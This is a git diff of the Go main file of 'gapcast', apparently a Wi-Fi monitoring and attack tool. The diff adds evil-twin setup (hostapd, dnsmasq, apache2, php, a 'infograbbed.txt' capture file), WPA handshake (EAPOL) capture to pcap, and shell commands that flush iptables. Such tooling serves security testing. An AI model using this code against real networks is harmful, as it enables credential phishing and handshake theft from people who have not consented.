@@ -6,6 +6,16 @@ import (
 	"gapcast/libs"
 	"gapcast/libs/injpacket"
 	"gapcast/libs/jsonreader"
+	bettercap "github.com/bettercap/bettercap/packets"
+	"github.com/eiannone/keyboard"
+	colo "github.com/fatih/color"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+	"github.com/google/gopacket/pcapgo"
+	"github.com/rodaine/table"
+	"golang.design/x/hotkey"
+	"golang.org/x/exp/maps"
 	"math"
 	"os"
 	"os/exec"
@@ -17,75 +27,78 @@ import (
 	"sync"
 	"text/tabwriter"
 	"time"
-	bettercap "github.com/bettercap/bettercap/packets"
-	"github.com/eiannone/keyboard"
-	colo "github.com/fatih/color"
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
-	"github.com/google/gopacket/pcap"
-	"github.com/google/gopacket/pcapgo"
-	"github.com/rodaine/table"
-	"golang.design/x/hotkey"
-	"golang.org/x/exp/maps"
 )
 
 var (
-	oldmoment            bool                         = true
-	G5                   bool                         = false
-	enabledWriter        bool                         = false
-	panicExit            bool                         = false
-	singleChannel        bool                         = false
-	paused               bool                         = false
-	stopScan             bool                         = false
-	writing              bool                         = false
-	rssiradar            bool                         = false
-	openTable            bool                         = false
-	injection            bool                         = false
-	injblock             bool                         = false
-	alreadyDKeyReg       bool                         = false
-	sngtrgLoading        bool                         = false
-	tdaPresent           bool                         = false
-	rdaPresent           bool                         = false
-	pddPresent           bool                         = false
-	mt                   chan bool                    = make(chan bool)
-	mtLoading            chan bool                    = make(chan bool)
-	exitChannel          chan bool                    = make(chan bool)
-	chanstage            chan bool                    = make(chan bool)
-	inactiveClient       map[string]libs.DeviceClient = make(map[string]libs.DeviceClient)
-	inactiveDevice       map[string]libs.Device       = make(map[string]libs.Device)
-	mutex                sync.RWMutex                 = sync.RWMutex{}
-	analysisData         *libs.Alldata                = new(libs.Alldata)
-	globalChannel        int
-	tableScene           int
-	errTable             int
-	txdbiAnt             float64
-	rxdbiAnt             float64
-	pwrdbmDevice         float64
-	chTable              string
-	srcTable             string
-	dstTable             string
-	esdTable             string
-	capturedEapol        []string
-	macFilter            string
-	handle               *pcap.Handle
-	color                libs.Colors
-	elapsedTime          time.Time
-	chartBSSID           table.Table
-	chartCLIENT          table.Table
-	macdb                []jsonreader.Macdb
-	pcapWriter           *pcapgo.Writer
-	pcapFile             *os.File
-	tableinj             libs.INJTable
-	seqdatalist          []libs.InjectData
-	regDKey              *hotkey.Hotkey
-	radarconf            jsonreader.RadarConf
+	apache2logFile   string
+	apnameiface      string
+	auth             string
+	chTable          string
+	cipher           string
+	dstTable         string
+	enc              string
+	esdTable         string
+	infograbfile     string
+	macFilter        string
+	nameiface        string
+	srcTable         string
+	pwrdbmDevice     float64
+	rxdbiAnt         float64
+	txdbiAnt         float64
+	errTable         int
+	globalChannel    int
+	tableScene       int
+	capturedEapol    []string
+	macdb            []jsonreader.Macdb
+	seqdatalist      []libs.InjectData
+	color            libs.Colors
+	apache2Conf      jsonreader.Apache2Conf
+	radarconf        jsonreader.RadarConf
+	chartBSSID       table.Table
+	chartCLIENT      table.Table
+	handle           *pcap.Handle
+	pcapWriter       *pcapgo.Writer
+	analysisData     *libs.Alldata = new(libs.Alldata)
+	pcapFile         *os.File
+	regDKey          *hotkey.Hotkey
+	chanstage        chan bool                    = make(chan bool)
+	exitChannel      chan bool                    = make(chan bool)
+	mt               chan bool                    = make(chan bool)
+	mtLoading        chan bool                    = make(chan bool)
+	inactiveClient   map[string]libs.DeviceClient = make(map[string]libs.DeviceClient)
+	inactiveDevice   map[string]libs.Device       = make(map[string]libs.Device)
+	mutex            sync.RWMutex                 = sync.RWMutex{}
+	elapsedTime      time.Time
+	ETLogRead        bool
+	G5               bool
+	alreadyDKeyReg   bool
+	disableInactiver bool
+	enabledWriter    bool
+	eviltwinAcc      bool
+	eviltwinMode     bool
+	eviltwinQuit     bool
+	injblock         bool
+	injection        bool
+	oldmoment        bool = true
+	onlyBeacon       bool
+	openTable        bool
+	panicExit        bool
+	paused           bool
+	pddPresent       bool
+	rdaPresent       bool
+	rssiRadar        bool
+	sngtrgLoading    bool
+	singleChannel    bool
+	tdaPresent       bool
+	writing          bool
+	tableinj         libs.INJTable
 )
 
-func collect() ([]int, string, string, string, bool, string, bool, bool, string) {
+func collect() (prefix string, channelList []int, pcapWriteFile string, fileLoader string, scanAfterLoad bool, scBSSID string) {
 	var ch *string = flag.String("c", "-1", "")
 	var load *string = flag.String("l", "?", "")
 	var bssid *string = flag.String("b", "?", "")
-	var prefix *string = flag.String("p", "?", "")
+	var prfix *string = flag.String("p", "?", "")
 	var write *string = flag.String("w", "?", "")
 	var g5 *bool = flag.Bool("5g", false, "")
 	var g5g24 *bool = flag.Bool("2.4+5g", false, "")
@@ -96,182 +109,113 @@ func collect() ([]int, string, string, string, bool, string, bool, bool, string)
 	var rxdbi *string = flag.String("dbi-rx", "?", "")
 	var pwrdbm *string = flag.String("dbm", "?", "")
 	var iface *string = flag.String("i", "?", "")
-	var showi *bool = flag.Bool("show-i", false, "")
+	var showiface *bool = flag.Bool("show-i", false, "")
 	var nmrestart *bool = flag.Bool("nm-restart", false, "")
 	var sc *string = flag.String("sc", "?", "")
+	var encr *string = flag.String("enc", "?", "")   // OPEN, WPE, WPA, WPA2
+	var cip *string = flag.String("cipher", "?", "") // WEP, TKIP, WRAP, CCMP, WEP104
+	var aut *string = flag.String("auth", "?", "")   // MGT, PSK
 
-	flag.Usage = func() {
-		fmt.Println("Usage of gapcast:")
-		fmt.Println()
-		fmt.Println("Interfaces & band misc:")
-		fmt.Println("   -show-i")
-		fmt.Println("        Shows available network interfaces.")
-		fmt.Println("   -i <interface> : string")
-		fmt.Println("        Select network interface.")
-		fmt.Println("   -5g")
-		fmt.Println("        Start with 5 Ghz band.")
-		fmt.Println("   -2.4+5g")
-		fmt.Println("        Start with 2.4/5 Ghz band.")
-		fmt.Println("   -nm-restart")
-		fmt.Println("        Restart Network Manager. (Only for Linux)")
-		fmt.Println()
-		fmt.Println("Filter misc:")
-		fmt.Println("   -c <channel> : int")
-		fmt.Println("   -c <channels> : int,int,int...")
-		fmt.Println("        Select working channel.")
-		fmt.Println("   -b <BSSID> : string")
-		fmt.Println("        Select BSSID filter.")
-		fmt.Println("   -p <BSSID PREFIX> : string")
-		fmt.Println("        Select BSSID prefix filter.")
-		fmt.Println("   -beacon")
-		fmt.Println("        Shows only beacons.")
-		fmt.Println("   -d")
-		fmt.Println("        Disable inactive devices hider.")
-		fmt.Println("   -radar")
-		fmt.Println("        Enable RadarRSSI.")
-		fmt.Println()
-		fmt.Println("Work with pcap:")
-		fmt.Println("    -w <file>.pcap")
-		fmt.Println("        Write to pcap file.")
-		fmt.Println("    -l <file>.pcap")
-		fmt.Println("        Load pcap file.")
-		fmt.Println()
-		fmt.Println("Features:")
-		fmt.Println("    -sc <BSSID> : string")
-		fmt.Println("        Scan a single target carefully.")
-		fmt.Println()
-		fmt.Println("Radar misc:")
-		fmt.Println("    -dbi-tx <int (or float)>")
-		fmt.Println("        Set TX antenna dBi.")
-		fmt.Println("    -dbi-rx <int (or float)>")
-		fmt.Println("        Set RX antenna dBi.")
-		fmt.Println("    -dbm <int (or float)>")
-		fmt.Println("        Set TX power.")
-		os.Exit(1)
-	}
-
+	flag.Usage = func() { libs.PrintUsage(); os.Exit(1) }
 	flag.Parse()
 
-	if *showi {
-		if libs.RootCheck() {
-			if runtime.GOOS == "windows" {
-				fmt.Println("HW-ADDR               NAME")
-				for _, iface := range libs.ShowIfaces() {
-					fmt.Println(iface.Name + "     " + iface.Mac)
-				}
-			} else {
-				var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
-				fmt.Fprintln(writer, "Interface\tHW-ADDR\tMode\tChannel\tTXpower\tDriver\tChipset")
-				var exist int = 0
-				for _, iface := range libs.ShowIfaces() {
-					ifaceinfo, err := libs.GetIfaceInfo(iface.Name) 
-					if err {
-						continue
-					}
-					fmt.Fprintln(writer, iface.Name + "\t" + iface.Mac + "\t" + ifaceinfo[0] + "\t" + ifaceinfo[1] + "\t" + ifaceinfo[2] + "\t" + ifaceinfo[3] + "\t" + ifaceinfo[4])
-					exist++
-				}
-				if exist > 0 {
-					writer.Flush()
-				} else {
-					fmt.Println("No valid interface found.")
+	if libs.RootCheck() {
+		if *iface != "?" {
+			var ifaceFound bool
+			for _, ifaceS := range libs.ShowIfaces() {
+				if ifaceS.Name == *iface {
+					ifaceFound = true
+					break
 				}
 			}
-		} else {
-			fmt.Println("Unrooted.")
-		}
-		os.Exit(0)
-	}
+			if !ifaceFound {
+				fmt.Println("\nBad interface, if you want to see the available interfaces add -show-i parameter.")
 
-	if *nmrestart {
-		if runtime.GOOS == "linux" {
-			if libs.RootCheck() {
-				var nmrestartSeq []string = []string{"service networking restart", "service NetworkManager restart"}
-				for _, nmcmd := range nmrestartSeq {
-					if _, err := libs.Rtexec(exec.Command("bash", "-c", nmcmd)); err {
-						fmt.Println("Unable to restart Network Manager.")
-						os.Exit(0)
-					}
-				}
-				fmt.Println("Network Manager restarted successful.")
-			} else {
-				fmt.Println("Unrooted.")
 			}
-		} else {
-			fmt.Println("Valid parameter for only Linux system.")
 		}
-		os.Exit(0)
+		switch true {
+		case *showiface:
+			var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
+			var isPresent bool = false
+			fmt.Fprintln(writer, "Interface\tHW-ADDR\tMode\tChannel\tTXpower\tDriver\tChipset")
+			for _, ifaceS := range libs.ShowIfaces() {
+				if ifaceinfo, err := libs.GetIfaceInfo(ifaceS.Name); !err {
+					fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n", ifaceS.Name, ifaceS.Mac, ifaceinfo[0], ifaceinfo[1], ifaceinfo[2], ifaceinfo[3], ifaceinfo[4])
+					isPresent = true
+				}
+			}
+			if isPresent {
+				writer.Flush()
+			} else {
+				fmt.Println("No valid interface found.")
+				os.Exit(1)
+			}
+		case *nmrestart:
+			if _, err := libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd && iptables --flush && iptables -t nat --flush && service networking restart && service NetworkManager restart && service apache2 stop")); err {
+				fmt.Println("Unable to restart Network Manager.")
+				os.Exit(1)
+			}
+			fmt.Println("Network Manager restarted successful.")
+		}
+	} else {
+		fmt.Println("Unrooted.")
+		os.Exit(1)
 	}
 
 	if *sc != "?" {
 		if !libs.IsValidMAC(*sc) {
-			fmt.Println("Mac address " + *sc + " is invalid (-sc).\n")
+			fmt.Printf("Mac address %s is invalid (-sc).\n\n", *sc)
 			flag.Usage()
 		}
 	}
-
 	if *iface == "?" && *load == "?" {
-		fmt.Println("Select an interface. If you want to see the available interfaces add -show-i parameter.")
-		fmt.Println()
+		fmt.Print("Select an interface. If you want to see the available interfaces add -show-i parameter.\n\n")
 		flag.Usage()
 	}
-
 	if *g5 && *g5g24 {
-		fmt.Println("You can't add both -5g and -2.4+5g, you have to select only one.")
-		fmt.Println()
+		fmt.Print("You can't add both -5g and -2.4+5g, you have to select only one.\n\n")
+		flag.Usage()
+	}
+	if *encr != "?" && !strings.Contains("OPEN WPE WPA WPA2", strings.ToUpper(*encr)) {
+		fmt.Printf("%s is invalid parameter for enc, available: 'OPEN', 'WPE', 'WPA', 'WPA2'.\n\n", strings.ToUpper(*encr))
+		flag.Usage()
+	}
+	if *cip != "?" && !strings.Contains("WEP, TKIP, WRAP, CCMP, WEP104", strings.ToUpper(*cip)) {
+		fmt.Printf("%s is invalid parameter for cipher (-cipher), available: 'WEP', 'TKIP', 'WRAP', 'CCMP', 'WEP104'.\n\n", strings.ToUpper(*cip))
+		flag.Usage()
+	}
+	if *aut != "?" && !strings.Contains("MGT, PSK", strings.ToUpper(*aut)) {
+		fmt.Printf("%s is invalid parameter for auth (-auth), available: 'MGT', 'PSK'.\n\n", strings.ToUpper(*aut))
 		flag.Usage()
 	}
 
 	var lencount int = 0
-	var loadScan bool = false
-	if *ch != "-1" {
-		lencount += 2
+	for idx, stringFlag := range []string{*ch, *bssid, *write, *iface, *prfix, *load, *sc, *txdbi, *rxdbi, *pwrdbm, *encr, *cip, *aut} {
+		if (stringFlag != "?" && idx != 0) || (stringFlag != "-1" && idx == 0) {
+			lencount += 2
+		}
 	}
-	if *bssid != "?" {
-		lencount += 2
+	for _, boolFlag := range []bool{*g5, *g5g24, *dinac, *radar, *beacon} {
+		if boolFlag {
+			lencount++
+		}
 	}
-	if *write != "?" {
-		lencount += 2
-	}
-	if *iface != "?" {
-		lencount += 2
-	}
-	if *prefix != "?" {
-		lencount += 2
-	}
-	if *prefix != "?" && *bssid != "?" {
-		fmt.Println("You can't add both -p and -b, -p don't work if bssid is specified.")
-		fmt.Println()
+
+	if len(os.Args)-1 > lencount {
 		flag.Usage()
 	}
-	if *g5 {
-		lencount++
+
+	if *prfix != "?" && *bssid != "?" {
+		fmt.Print("You can't add both -p and -b, -p don't work if BSSID is specified.\n\n")
+		flag.Usage()
 	}
-	if *g5g24 {
-		lencount++
-	}
-	if *dinac {
-		lencount++
-	}
-	if *radar {
-		lencount++
-	}
-	if *beacon {
-		lencount++
-	}
-	if *load != "?" {
-		lencount += 2
-	}
-	if *sc != "?" {
-		lencount += 2
-	}
+
 	var errc error
 	if *txdbi != "?" {
 		if txdbiAnt, errc = strconv.ParseFloat(*txdbi, 64); errc != nil {
 			fmt.Println("TX dBi " + *txdbi + " is not int or float.\n")
 			flag.Usage()
 		}
-		lencount += 2
 		tdaPresent = true
 	}
 	if *rxdbi != "?" {
@@ -279,7 +223,6 @@ func collect() ([]int, string, string, string, bool, string, bool, bool, string)
 			fmt.Println("RX dBi " + *rxdbi + " is not int or float.\n")
 			flag.Usage()
 		}
-		lencount += 2
 		rdaPresent = true
 	}
 	if *pwrdbm != "?" {
@@ -287,124 +230,156 @@ func collect() ([]int, string, string, string, bool, string, bool, bool, string)
 			fmt.Println("TX Power " + *pwrdbm + " is not int or float.\n")
 			flag.Usage()
 		}
-		lencount += 2
 		pddPresent = true
 	}
 
-	if len(os.Args) - 1 > lencount {
+	channelList, msgerror := libs.ParseChannels(*ch, *g5, *g5g24)
+	if msgerror != "" {
+		fmt.Printf("%s\n\n", msgerror)
 		flag.Usage()
 	}
-
-	ChannelList, err := libs.ParseChannels(*ch, *g5, *g5g24)
-	if err != "" {
-		fmt.Println(err)
-		fmt.Println()
-		flag.Usage()
-	}
-	if !(ChannelList[0] != -1 && len(ChannelList) > 1) {
+	if !(channelList[0] != -1 && len(channelList) > 1) {
 		singleChannel = true
 	}
 
 	if *bssid != "?" {
 		if !libs.IsValidMAC(*bssid) {
-			fmt.Println("Mac address " + *bssid + " is invalid.\n")
+			fmt.Printf("Mac address %s is invalid.\n\n", *bssid)
 			flag.Usage()
 		}
-		if len(ChannelList) == 0 || len(ChannelList) > 1 {
-			fmt.Println("Only one channel is needed if you use -b parameter.")
-			fmt.Println()
+		if len(channelList) == 0 || len(channelList) > 1 {
+			fmt.Print("Only one channel is needed if you use -b parameter.\n\n")
 			flag.Usage()
 		}
 	} else {
 		*bssid = ""
 	}
+	if *load != "?" {
+		if lencount >= 4 && *iface != "?" {
+			scanAfterLoad = true
+		} else if lencount > 2 {
+			fmt.Println(lencount)
+			fmt.Print("If you have added the load parameter you cannot add other parameters if you don't specified the interface.\n\n")
+			flag.Usage()
+		}
+	}
 
 	macFilter = strings.ToLower(*bssid)
 	G5 = *g5
-	rssiradar = *radar
-
-	if *load != "?" {
-		if lencount >= 4 && *iface != "?" {
-			loadScan = true
-		} else if lencount > 2 {
-			fmt.Println("If you have added the load parameter you cannot add other parameters if you don't specified the interface.")
-			fmt.Println()
-			flag.Usage()
-		} 
-	}
-
-	return ChannelList, *write, *iface, strings.ToLower(*prefix), *dinac, *load, loadScan, *beacon, *sc
+	rssiRadar = *radar
+	nameiface = *iface
+	disableInactiver = *dinac
+	enc, cipher, auth = strings.ToUpper(*encr), strings.ToUpper(*cip), strings.ToUpper(*aut)
+	return strings.ToLower(*prfix), channelList, *write, *load, scanAfterLoad, *sc
 }
 
-func signalExit(nameiface string, oldmoment bool) {
+func signalExit() {
+	if ETLogRead {
+		for !eviltwinQuit {
+			time.Sleep(1 * time.Second)
+		}
+	}
 	if enabledWriter {
 		defer pcapFile.Close()
 	}
 	defer os.Exit(0)
 	if oldmoment {
 		mt <- true
-	} 
+	}
 	if sngtrgLoading {
 		chanstage <- true
 	}
 	time.Sleep(200 * time.Millisecond)
 	fmt.Println()
-	go libs.Loading("[" + color.Blue + "EXIT" + color.White + "] Setting up managed mode", mtLoading)
+	go libs.Loading(fmt.Sprintf("%s[%sEXIT%s] Setting up managed mode", color.White, color.Blue, color.White), mtLoading)
+	if eviltwinMode && apnameiface != nameiface {
+		libs.SetManagedMode(apnameiface)
+	}
 	libs.SetManagedMode(nameiface)
 	time.Sleep(1200 * time.Millisecond)
 	mtLoading <- true
 	time.Sleep(800 * time.Millisecond)
-	for writing {time.Sleep(100 * time.Millisecond)}
+	for writing {
+		time.Sleep(100 * time.Millisecond)
+	}
 }
 
-func startSignal(nameiface string) {
+func startSignal() {
 	var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyC)
 	regKey.Register()
 	defer regKey.Unregister()
 	for {
-		<- regKey.Keydown()
-		<- regKey.Keyup()
-		injection = false
-		openTable = false
+		<-regKey.Keydown()
+		<-regKey.Keyup()
+		injection, openTable = false, false
 		time.Sleep(100 * time.Millisecond)
 		panicExit = true
 		keyboard.Close()
+		if eviltwinMode {
+			libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd & iptables --flush & iptables -t nat --flush & service apache2 stop"))
+			fmt.Print(color.White + "Done\n")
+		}
+		for eviltwinAcc {
+			time.Sleep(1 * time.Second)
+			if eviltwinQuit {
+				break
+			}
+		}
 		time.Sleep(600 * time.Millisecond)
-		signalExit(nameiface, oldmoment)
+		signalExit()
 	}
 }
 
-func setup(file string, nameiface string, load bool, pcapfile string) string {
-	var iface string = libs.GetIfaceFromName(nameiface)
-	if iface == "" {
-		fmt.Println()
-		libs.SignalError(color, "Bad interface, if you want to see the available interfaces add -show-i parameter.")
+func setupChart() {
+	if rssiRadar {
+		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER", "RAY")
+	} else {
+		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER")
 	}
-	go startSignal(nameiface)
-	libs.ScreenClear()
+	chartBSSID.WithHeaderFormatter(colo.New(colo.BgHiBlue, colo.FgHiWhite).SprintfFunc())
+	if rssiRadar {
+		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER", "RAY")
+	} else {
+		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER")
+	}
+	chartCLIENT.WithHeaderFormatter(colo.New(colo.BgHiCyan, colo.FgHiWhite).SprintfFunc())
+	analysisData.DeviceData = make(map[string]libs.Device)
+	analysisData.ClientData = make(map[string]libs.DeviceClient)
+}
+
+func setup(file string, load bool, pcapfile string) {
+	go startSignal()
 	if libs.WriterCheck(file) {
 		enabledWriter = true
 		pcapFile, err := os.Create(file)
 		if err != nil {
 			pcapFile.Close()
-			fmt.Println("Invalid directory or file.")
-			fmt.Println()
+			fmt.Print("Invalid directory or file.\n\n")
 			os.Exit(1)
 		}
 		pcapWriter = pcapgo.NewWriter(pcapFile)
 		pcapWriter.WriteFileHeader(65536, layers.LinkTypeIEEE80211Radio)
 	}
+	libs.ScreenClear()
 	color = libs.SetupColors()
 	libs.PrintLogo(color, "Initializing...")
-	if !libs.AlreadyMon(nameiface) {
-		if !libs.MonManagementCheck() {
-			if runtime.GOOS == "windows" {
-				libs.SignalError(color, "Npcap not installed.")
-			} else {
-				libs.SignalError(color, "Aircrack-ng not installed. (Needed Airmon-ng)")
-			}
+	libs.Rtexec(exec.Command("airmon-ng", "check", "kill"))
+	for _, service := range []string{"apache2", "dnsmasq"} {
+		if !libs.SoftwareServiceCheck(service) {
+			libs.SignalError(color, fmt.Sprintf("%s isn't installed.", service))
 		}
-		go libs.Loading("[" + color.Green + "INIT" + color.White + "] Setting up monitor mode", mt)
+	}
+	for _, software := range []string{"airmon-ng", "iptables", "hostapd", "php"} {
+		if !libs.SoftwareCheck(software) {
+			libs.SignalError(color, fmt.Sprintf("%s isn't installed.", software))
+		}
+	}
+
+	if !libs.AlreadyMon(nameiface) {
+		if !libs.MonSupportCheck(nameiface) {
+			libs.SignalError(color, "Bad interface or no administrator.")
+		}
+		go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Setting up monitor mode", color.White, color.Green, color.White), mt)
 		if err := libs.SetMonitorMode(nameiface); err {
 			mt <- true
 			time.Sleep(400 * time.Millisecond)
@@ -415,86 +390,96 @@ func setup(file string, nameiface string, load bool, pcapfile string) string {
 		mt <- true
 		mt = make(chan bool)
 	} else {
-		fmt.Println("[" + color.Green + "INIT" + color.White + "] Skipped (Monitor mode already enabled)")
+		libs.NOTIMECustomLog(color, color.Green, "INIT", "Skipped (Monitor mode already enabled)")
 		time.Sleep(1200 * time.Millisecond)
 	}
 	if G5 && !libs.G5Check(nameiface) {
-		fmt.Println("\n[" + color.Red + "ERROR" + color.White + "] " + nameiface + " does not support 5 Ghz.")
+		fmt.Println()
+		libs.Error(color, fmt.Sprintf("%s does not support 5 Ghz.", nameiface))
 		time.Sleep(600 * time.Millisecond)
-		signalExit(nameiface, false)
+		signalExit()
 	}
-	go libs.Loading("[" + color.Green + "INIT" + color.White + "] Loading resources", mt)
-	var warning1, warning2 bool = false, false
+	go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading resources", color.White, color.Green, color.White), mt)
+	var warning1, warning2, warning3 bool
 	macdb, warning1 = jsonreader.ReadMacdb()
-	if rssiradar {
-		if tdaPresent && rdaPresent && pddPresent {
-			radarconf = jsonreader.RadarConf{TXAntennaDBI: txdbiAnt, RXAntennaDBI: rxdbiAnt, TXPowerDBM: pwrdbmDevice}
-		} else {
-			radarconf, warning2 = jsonreader.ReadRadarConf()
-			if tdaPresent {
-				radarconf.TXAntennaDBI = txdbiAnt
-			}
-			if rdaPresent {
-				radarconf.RXAntennaDBI = rxdbiAnt
-			}
-			if pddPresent {
-				radarconf.TXPowerDBM = pwrdbmDevice
-			}
-		}
-	}
+	apache2Conf, warning2 = jsonreader.ReadApache2Conf()
+	infograbfile, apache2logFile = apache2Conf.InfoGrabbed, apache2Conf.LOGFile
+	radarconf, warning3 = jsonreader.ReadRadarConf()
 	setupChart()
 	time.Sleep(1500 * time.Millisecond)
 	mt <- true
+	if rssiRadar {
+		if tdaPresent && rdaPresent && pddPresent {
+			radarconf = jsonreader.RadarConf{TXAntennaDBI: txdbiAnt, RXAntennaDBI: rxdbiAnt, TXPowerDBM: pwrdbmDevice}
+		} else {
+			for radaridx, isPresent := range []bool{tdaPresent, rdaPresent, pddPresent} {
+				if isPresent {
+					switch radaridx {
+					case 1:
+						radarconf.TXAntennaDBI = txdbiAnt
+					case 2:
+						radarconf.RXAntennaDBI = rxdbiAnt
+					case 3:
+						radarconf.TXPowerDBM = pwrdbmDevice
+					}
+				}
+			}
+		}
+	}
+	for warnidx, warn := range []bool{warning1, warning2, warning3} {
+		if warn {
+			switch warnidx {
+			case 0:
+				libs.Warning(color, "Failure to read the manufacturer db.")
+			case 1:
+				infograbfile = "/var/www/html/infograbbed.txt" // default
+				apache2logFile = "/var/log/apache2/access.log" // default
+				libs.Warning(color, "Failure to read the apache2 config, set default (access.log file).")
+			case 2:
+				libs.Warning(color, "Failure to read RadioRSSI config, set default.")
+			}
+			time.Sleep(1200 * time.Millisecond)
+		}
+	}
 	if load {
 		mt = make(chan bool)
-		go libs.Loading("[" + color.Green + "INIT" + color.White + "] Loading pcap file", mt)
+		go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading pcap file", color.White, color.Green, color.White), mt)
 		handle, err := pcap.OpenOffline(pcapfile)
+		time.Sleep(1500 * time.Millisecond)
 		if err != nil {
 			mt <- true
-			fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] No valid resources loaded.")
+			libs.Error(color, "No valid resources loaded.")
 			time.Sleep(1200 * time.Millisecond)
 		} else {
 			defer handle.Close()
-			handlePacket(handle, libs.G5g24Channels[:], "?", false, false, true)
+			handlePacket(handle, libs.G5g24Channels[:], "?", false, true)
 			mt <- true
 			if len(analysisData.DeviceData) <= 0 {
-				fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] No valid resources loaded.")
+				libs.Error(color, "No valid resources loaded.")
 				time.Sleep(1200 * time.Millisecond)
 			}
 		}
 	}
-	if warning1 {
-		fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] Failure to read the manufacturer db.")
-		time.Sleep(1200 * time.Millisecond)
-	}
-	if warning2 {
-		if tdaPresent || rdaPresent || pddPresent {
-			fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] Failure to read RadioRSSI config, set default. (Applied with custom conf)")
-		} else {
-			fmt.Println("[" + color.Yellow + "WARNING" + color.White + "] Failure to read RadioRSSI config, set default.")
-		}
-		time.Sleep(1200 * time.Millisecond)
-	}
 	oldmoment = false
 	time.Sleep(1 * time.Second)
-	return iface
 }
 
-func ChannelChanger(ChannelList []int, nameiface string) {
-	var changeCh func([]int, string) = func(ChannelList []int, nameiface string) {
+func channelChanger(channelList []int) {
+	var changeCh func([]int, string) = func(channelList []int, nameiface string) {
 		if singleChannel {
-			libs.ChangeChannel(nameiface, ChannelList[0])
-			globalChannel = ChannelList[0]
-			time.Sleep(100 * time.Millisecond)
+			libs.ChangeChannel(nameiface, channelList[0])
+			globalChannel = channelList[0]
+			time.Sleep(130 * time.Millisecond)
 		} else {
 			for {
-				for _, ch := range ChannelList {
+				for _, ch := range channelList {
 					select {
-					case <- exitChannel:
+					case <-exitChannel:
 						return
 					default:
-						for paused {time.Sleep(100 * time.Millisecond)}
-						for injblock {time.Sleep(100 * time.Millisecond)}
+						for paused || injblock {
+							time.Sleep(100 * time.Millisecond)
+						}
 						libs.ChangeChannel(nameiface, ch)
 						mutex.Lock()
 						globalChannel = ch
@@ -506,35 +491,200 @@ func ChannelChanger(ChannelList []int, nameiface string) {
 		}
 	}
 	if singleChannel {
-		changeCh(ChannelList, nameiface)
+		changeCh(channelList, nameiface)
 	} else {
-		go changeCh(ChannelList, nameiface)
+		go changeCh(channelList, nameiface)
 	}
 }
 
-func update() { 
+func update() {
 	var refreshTime time.Time = time.Now()
 	if elapsedTime == (time.Time{}) {
 		elapsedTime = time.Now()
-	}
-	var maxRefresh int64
-	switch runtime.GOOS {
-		case "windows":
-			maxRefresh = 450
-		default:
-		 	maxRefresh = 20
 	}
 	for {
 		time.Sleep(10 * time.Millisecond)
 		if panicExit {
 			exitChannel <- true
-			for {time.Sleep(2 * time.Second)}
+			for {
+				time.Sleep(2 * time.Second)
+			}
 		}
-		if int64(time.Since(refreshTime).Milliseconds()) > maxRefresh {
+		if time.Since(refreshTime).Milliseconds() > 20 {
 			printChart(false)
 			time.Sleep(time.Millisecond * 5)
 			refreshTime = time.Now()
 		}
+	}
+}
+
+func recEapol(packet gopacket.Packet) {
+	if packet.Layer(layers.LayerTypeDot11) != nil {
+		if exist, _, apmac, stamac := bettercap.Dot11ParseEAPOL(packet, packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)); exist {
+			if libs.IsValidMAC(apmac.String()) && libs.IsValidMAC(stamac.String()) && !slices.Contains(capturedEapol, apmac.String()+"<-"+stamac.String()) {
+				capturedEapol = append(capturedEapol, apmac.String()+"<-"+stamac.String())
+			}
+		}
+	}
+	if packet.Layer(layers.LayerTypeEAPOLKey) != nil {
+		mutex.Lock()
+		writeToPcap(packet)
+		mutex.Unlock()
+	}
+}
+
+func writeToPcap(packet gopacket.Packet) {
+	if enabledWriter && !panicExit {
+		writing = true
+		pcapWriter.WritePacket(gopacket.CaptureInfo{
+			Timestamp:     time.Now(),
+			Length:        len(packet.Data()),
+			CaptureLength: len(packet.Data()),
+		}, packet.Data())
+		writing = false
+	}
+}
+
+func handlePacket(handle *pcap.Handle, chans []int, prefix string, filter bool, offload bool) {
+	var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
+	defer handle.Close()
+
+	var firstMP, lastMP time.Time
+	if offload {
+		defer func() { elapsedTime = time.Now().Add(-lastMP.Sub(firstMP)) }()
+	}
+
+	for pkt := range packets.Packets() {
+		if paused || panicExit {
+			return
+		}
+		if offload {
+			lastMP = pkt.Metadata().Timestamp
+			if firstMP.IsZero() {
+				firstMP = pkt.Metadata().Timestamp
+			}
+		}
+		go recEapol(pkt)
+		go func(packet gopacket.Packet) {
+			if packet.ErrorLayer() == nil && packet != nil && packet.Layer(layers.LayerTypeDot11) != nil {
+				if PWR, err := libs.GetDBM(packet); !err {
+					if libs.IsBeacon(packet) {
+						if SRC, err1 := libs.GetSRCBeacon(packet); !err1 {
+							if filter && ((macFilter != "" && !strings.EqualFold(macFilter, SRC)) || (prefix != "?" && !strings.HasPrefix(strings.ToLower(SRC), strings.ToLower(prefix)))) {
+								return
+							}
+							exist1, ENC := libs.GetEncString(bettercap.Dot11ParseEncryption(packet, packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)))
+							if (enc != "?" && !strings.Contains(ENC, enc)) || (cipher != "?" && !strings.Contains(ENC, cipher)) || (auth != "?" && !strings.Contains(ENC, auth)) {
+								return
+							}
+							exist2, Channel := bettercap.Dot11ParseDSSet(packet)
